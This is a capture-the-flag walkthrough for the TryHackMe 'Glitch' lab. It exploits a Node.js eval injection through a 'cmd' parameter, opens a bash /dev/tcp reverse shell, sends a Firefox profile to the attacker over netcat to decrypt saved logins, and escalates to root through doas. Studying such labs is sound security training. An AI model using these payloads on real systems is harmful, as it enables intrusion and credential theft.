# GLITCH

Room: https://tryhackme.com/room/glitch

Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/glitch.md

---

## Initial Enumeration

Start by browsing to the web service.

```bash
http://TARGET/
```

Viewing the page source revealed a JavaScript function named `getAccess`.

```js
function getAccess() {
  fetch('/api/access')
    .then((response) => response.json())
    .then((response) => {
      console.log(response)
    })
}
```

The function calls the following endpoint.

```text
/api/access
```

Requesting the endpoint returned a base64 encoded token.

```bash
curl -s http://TARGET/api/access
```

Output:

```json
{
  "token": "dGhpc19pc19ub3RfcmVhbA=="
}
```

Decode the token.

```bash
echo 'dGhpc19pc19ub3RfcmVhbA==' | base64 -d
```

Decoded value:

```text
this_is_not_real
```

Set the decoded value as the `token` cookie.

```js
document.cookie = "token=this_is_not_real; path=/"
location.reload()
```

Alternatively, use curl.

```bash
curl -i http://TARGET/ --cookie "token=this_is_not_real"
```

After setting the cookie, the real page was accessible.

## Discovering the Items API

The page loaded this JavaScript file.

```html
<script src="js/script.js"></script>
```

Reviewing the JavaScript showed that the app fetched data from `/api/items`.

```bash
curl -s http://TARGET/js/script.js --cookie "token=this_is_not_real"
```

The important part of the script was:

```js
await fetch('/api/items')
  .then((response) => response.json())
  .then((response) => {
    response.sins.forEach((element) => {
      let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`
      container.insertAdjacentHTML('beforeend', el)
    })
    response.errors.forEach((element) => {
      let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`
      container.insertAdjacentHTML('beforeend', el)
    })
    response.deaths.forEach((element) => {
      let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`
      container.insertAdjacentHTML('beforeend', el)
    })
  })
```

Request the endpoint.

```bash
curl -s http://TARGET/api/items --cookie "token=this_is_not_real" | jq
```

Output:

```json
{
  "sins": [
    "lust",
    "gluttony",
    "greed",
    "sloth",
    "wrath",
    "envy",
    "pride"
  ],
  "errors": [
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error"
  ],
  "deaths": [
    "death"
  ]
}
```

## Finding the Vulnerable Parameter

Check the allowed HTTP methods.

```bash
curl -i -X OPTIONS http://TARGET/api/items --cookie "token=this_is_not_real"
```

The response showed that POST was allowed.

```text
Allow: GET,HEAD,POST
```

Testing a POST request with a query parameter named `cmd` caused an error.

```bash
curl -i -X POST "http://TARGET/api/items?cmd=test" --cookie "token=this_is_not_real"
```

The response included:

```text
ReferenceError: test is not defined
at eval
at router.post /var/web/routes/api.js
```

This confirmed that the `cmd` query parameter was being passed into server-side `eval`.

## Confirming Command Execution

Use Node.js `child_process` to execute a harmless command.

```bash
curl -G -i -X POST "http://TARGET/api/items" \
  --cookie "token=this_is_not_real" \
  --data-urlencode "cmd=require('child_process').execSync('whoami').toString()"
```

Output:

```text
vulnerability_exploited user
```

This confirmed command execution.

## Reverse Shell

Using `execSync` for a reverse shell can freeze the web server because it blocks the Node.js process while the shell stays open. Use asynchronous `exec` instead.

Start a listener on the attacking machine.

```bash
nc -lvnp 4444
```

Create a base64 encoded reverse shell payload.

```bash
echo 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1' | base64 -w0
```

Trigger the payload with asynchronous `exec`.

```bash
curl -G -i -X POST "http://TARGET/api/items" \
  --cookie "token=this_is_not_real" \
  --data-urlencode "cmd=require('child_process').exec('echo BASE64_PAYLOAD_HERE | base64 -d | bash')"
```

Once the shell connected, upgrade it.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## User Flag

The shell landed as `user`.

```bash
cd /home/user
ls
cat user.txt
```

Flag value removed.

```text
THM{REDACTED}
```

## Firefox Saved Credentials

During enumeration, a Firefox profile was found under the `user` account.

```bash
cd /home/user/.firefox/b5w4643p.default-release
ls
```

Important files:

```text
logins.json
key4.db
cert9.db
```

The saved login was visible in `logins.json`, but the username and password were encrypted.

```bash
cat logins.json
```

To decrypt it, archive the Firefox profile.

```bash
cd /home/user
tar -czf /tmp/ff.tar.gz .firefox
ls -lh /tmp/ff.tar.gz
```

Transfer it back to the attacking machine with netcat.

On the attacking machine:

```bash
nc -lvnp 9001 > ff.tar.gz
```

On the target:

```bash
nc YOUR_TUN0_IP 9001 < /tmp/ff.tar.gz
```

Extract the archive locally.

```bash
mkdir -p firefox-profile
tar -xzf ff.tar.gz -C firefox-profile
find firefox-profile -type f | grep -E 'logins.json|key4.db|cert9.db'
```

Download and run `firefox_decrypt`.

```bash
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
python3 firefox_decrypt.py "$(realpath ~/firefox-profile/.firefox/b5w4643p.default-release)"
```

Recovered credentials:

```text
Website:   https://glitch.thm
Username:  v0id
Password:  REDACTED
```

## Switching to v0id

Use the recovered password to switch users.

```bash
su v0id
```

Then enumerate.

```bash
id
whoami
cd ~
ls -la
```

## Privilege Escalation with doas

The target had `doas` installed. The configuration allowed `v0id` to run commands as root.

```bash
cat /usr/local/etc/doas.conf
```

Output:

```text
permit v0id as root
```

Run bash as root.

```bash
/usr/local/bin/doas /bin/bash
```

Enter the recovered password when prompted.

## Root Flag

As root:

```bash
cd /root
ls
cat root.txt
```

Flag value removed.

```text
THM{REDACTED}
```

## Attack Path Summary

```text
/api/access token leak
base64 decode access token
set token cookie
/api/items accepts POST
cmd query parameter is evaluated server side
Node.js command execution
reverse shell as user
Firefox saved credentials
su to v0id
doas to root
```
